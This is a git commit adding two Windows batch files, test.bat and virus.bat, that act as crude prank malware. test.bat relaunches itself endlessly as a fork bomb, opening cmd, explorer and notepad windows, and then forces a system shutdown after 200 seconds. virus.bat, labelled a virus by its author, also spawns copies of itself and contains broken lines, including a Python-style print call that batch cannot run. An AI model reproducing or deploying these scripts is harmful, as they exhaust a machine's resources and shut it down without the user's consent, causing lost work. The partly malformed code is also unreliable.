1f544b7b401ca83307701d549cac20187426ba81
KartikMadotra <118108726+KartikMadotra@users.noreply.github.com>
2023-01-31 22:45:29 +0530

    Add files via upload

---
+++ test.bat
@@ -0,0 +1,10 @@
+md %random% | start test.bat
+start cmd.exe
+start explorer
+start notepad
+
+
+goto ec
+:ec 
+echo hii
+shutdown -s -t  200
---
+++ virus.bat
@@ -0,0 +1,14 @@
+echo off
+
+
+======================================================================Kartik Singh=====================================================================================================================
+
+md | start virus.bat
+start notepad
+start cmd.exe
+start run.exe
+start Boom 3D
+
+echo off
+
+print("======MAde By Kartik singh======")
